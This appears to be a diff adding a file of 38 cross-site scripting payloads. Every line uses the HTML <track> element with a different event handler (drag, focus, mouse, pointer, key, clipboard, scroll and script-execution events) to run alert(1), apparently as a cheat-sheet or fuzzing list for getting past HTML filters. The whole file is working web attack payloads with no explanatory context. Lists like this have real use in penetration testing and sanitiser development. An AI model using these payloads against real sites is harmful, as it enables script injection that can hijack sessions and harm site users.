@@ -1,0 +1,38 @@
+<track contenteditable onbeforeinput=alert(1)>test
+<track draggable="true" ondrag="alert(1)" style=display:block>test</track>
+<track draggable="true" ondragend="alert(1)" style=display:block>test</track>
+<track draggable="true" ondragenter="alert(1)" style=display:block>test</track>
+<track draggable="true" ondragleave="alert(1)" style=display:block>test</track>
+<track draggable="true" ondragstart="alert(1)" style=display:block>test</track>
+<track id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></track>
+<track id=x tabindex=1 onfocus=alert(1)></track>
+<track id=x tabindex=1 onfocusin=alert(1)></track>
+<track onafterscriptexecute=alert(1)><script>1</script>
+<track onbeforescriptexecute=alert(1)><script>1</script>
+<track onblur=alert(1) id=x tabindex=1 style=display:block>test</track><input value=clickme>
+<track onclick="alert(1)" style=display:block>test</track>
+<track oncontextmenu="alert(1)" style=display:block>test</track>
+<track oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<track oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<track ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</track>
+<track onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</track><input value=clickme>
+<track onkeydown="alert(1)" contenteditable style=display:block>test</track>
+<track onkeypress="alert(1)" contenteditable style=display:block>test</track>
+<track onkeyup="alert(1)" contenteditable style=display:block>test</track>
+<track onmousedown="alert(1)" style=display:block>test</track>
+<track onmouseenter="alert(1)" style=display:block>test</track>
+<track onmouseleave="alert(1)" style=display:block>test</track>
+<track onmousemove="alert(1)" style=display:block>test</track>
+<track onmouseout="alert(1)" style=display:block>test</track>
+<track onmouseover="alert(1)" style=display:block>test</track>
+<track onmouseup="alert(1)" style=display:block>test</track>
+<track onmousewheel=alert(1) style=display:block>requires scrolling
+<track onpointerdown=alert(1) style=display:block>XSS</track>
+<track onpointerenter=alert(1) style=display:block>XSS</track>
+<track onpointerleave=alert(1) style=display:block>XSS</track>
+<track onpointermove=alert(1) style=display:block>XSS</track>
+<track onpointerout=alert(1) style=display:block>XSS</track>
+<track onpointerover=alert(1) style=display:block>XSS</track>
+<track onpointerrawupdate=alert(1) style=display:block>XSS</track>
+<track onpointerup=alert(1) style=display:block>XSS</track>
+<track onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></track>
